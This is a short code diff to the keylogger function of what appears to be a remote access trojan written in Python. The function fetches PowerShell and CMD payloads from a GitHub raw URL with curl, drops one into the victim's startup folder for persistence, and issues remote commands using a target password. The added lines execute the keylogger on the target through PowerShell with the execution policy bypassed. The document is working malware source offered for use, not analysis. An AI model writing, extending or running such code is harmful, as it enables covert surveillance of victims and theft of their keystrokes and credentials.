@@ -111,7 +111,9 @@ def keylogger(address, target_password, startup_dir, working_dir):
 
     scheduler_command = f'curl -L https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/l.ps1 -o "{working_dir}/l.ps1"'
 
+    
     controller_command = f'curl -L https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/payloads/c.cmd -o "{startup_dir}/c.cmd"'
+    execute_keylogger = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& \\"{working_dir}/keylogger.ps1\\""'
     print("[+] Keylogger Prepped")
 
     print("[*] Installing keylogger...")
@@ -121,7 +123,9 @@ def keylogger(address, target_password, startup_dir, working_dir):
     print("[*] Installing Controller...")
 
     remote_commands(address, target_password, controller_command)
-    print("[+] Keylogger Installed Sucessfully")
+    print("[+] Keylogger Installed Sucessfully\n")
+    print("\n [*] Executing Keylogger")
+    remote_commands(address, target_password,execute_keylogger)
 
 
 
